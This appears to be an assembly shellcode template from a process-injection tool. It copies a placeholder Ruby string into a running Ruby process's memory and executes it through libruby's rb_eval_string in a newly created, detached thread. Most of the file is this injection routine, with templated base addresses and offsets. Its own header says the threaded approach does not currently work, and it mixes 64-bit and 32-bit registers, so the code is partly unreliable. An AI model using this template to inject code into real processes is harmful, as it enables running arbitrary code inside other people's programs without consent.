// an attempt to work around Ruby locking up when code is injected
// does not currently work any better than the unthreaded veesion

[FRAGMENT:asminject_copy_bytes.s:FRAGMENT]
[FRAGMENT:asminject_libpthread_pthread_create.s:FRAGMENT]
[FRAGMENT:asminject_libpthread_pthread_detach.s:FRAGMENT]
[FRAGMENT:asminject_libpthread_pthread_exit.s:FRAGMENT]
[FRAGMENT:asminject_nanosleep.s:FRAGMENT]

	# // BEGIN: call ruby_sysinit
	# push ebx
	# lea eax, ruby_argv[eip]	# fake argv data
	# lea edx, ruby_argc[eip]	# fake argc data
	# mov esi, edx
	# mov edi, eax
	# mov ebx, [BASEADDRESS:.+/libruby[0-9\.so\-]+$:BASEADDRESS] + [RELATIVEOFFSET:ruby_sysinit:RELATIVEOFFSET]
	# call ebx
	# pop ebx
	# // END: call ruby_sysinit
	
	# // BEGIN: call ruby_init_stack
	# push ebx
	# lea eax, [ebp - 8]
	# mov edi, eax
	# mov ebx, [BASEADDRESS:.+/libruby[0-9\.so\-]+$:BASEADDRESS] + [RELATIVEOFFSET:ruby_init_stack:RELATIVEOFFSET]
	# call ebx
	# pop ebx
	# // END: call ruby_init_stack
	
	# // BEGIN: call ruby_init
	# push ebx
	# mov ebx, [BASEADDRESS:.+/libruby[0-9\.so\-]+$:BASEADDRESS] + [RELATIVEOFFSET:ruby_init:RELATIVEOFFSET]
	# call ebx
	# pop ebx
	# // END: call ruby_init
	
	# // BEGIN: call ruby_init_loadpath
	# push ebx
	# mov ebx, [BASEADDRESS:.+/libruby[0-9\.so\-]+$:BASEADDRESS] + [RELATIVEOFFSET:ruby_init_loadpath:RELATIVEOFFSET]
	# call ebx
	# pop ebx
	# // END: call ruby_init_loadpath
	
	// copy the Ruby string to arbitrary read/write memory
	push r14
	mov edi, arbitrary_read_write_data_address[eip]
	add edi, 32
	lea esi, ruby_code[eip]
	mov ecx, [VARIABLE:rubycode.length:VARIABLE]
	add ecx, 2												# null terminator
	call asminject_copy_bytes
	pop r14
	// END: copy the Ruby string to arbitrary read/write memory
	
	// BEGIN: call rb_eval_string
	push r14
	push ebx
	mov edi, arbitrary_read_write_data_address[eip]
	add edi, 32
	mov ebx, [BASEADDRESS:.+/libruby[0-9\.so\-]+$:BASEADDRESS] + [RELATIVEOFFSET:rb_eval_string:RELATIVEOFFSET]
	call ebx
	pop ebx
	pop r14
	// END: call rb_eval_string
	
	# // BEGIN: call ruby_cleanup
	# push ebx
	# mov edi, 0
	# mov ebx, [BASEADDRESS:.+/libruby[0-9\.so\-]+$:BASEADDRESS] + [RELATIVEOFFSET:ruby_cleanup:RELATIVEOFFSET]
	# call ebx
	# pop ebx
	# // END: call ruby_cleanup
	
	#mov eax, 0
	#mov edi, 0
	#call asminject_libpthread_pthread_exit
	# calling pthread_exit here will cause Ruby to crash with a stack trace
	ret
	
forever_loop:
	mov edi, 10
	mov esi, 10
	call asminject_nanosleep
	jmp forever_loop

execute_ruby_code_main:
	lea edx, execute_ruby_code_inner[eip]
	mov edi, arbitrary_read_write_data_address[eip]
	add edi, 0x1000		# don't overwrite anything important
	push edx
	push edi
	call asminject_libpthread_pthread_create
	pop edi
	pop edx
// detach the newly-created thread where the library has been loaded
	call asminject_libpthread_pthread_detach

SHELLCODE_SECTION_DELIMITER

ruby_code:
	.ascii "[VARIABLE:rubycode:VARIABLE]\0"

#ruby_argv:
#	.ascii "\0"
	
#ruby_argc:
#	.byte 1

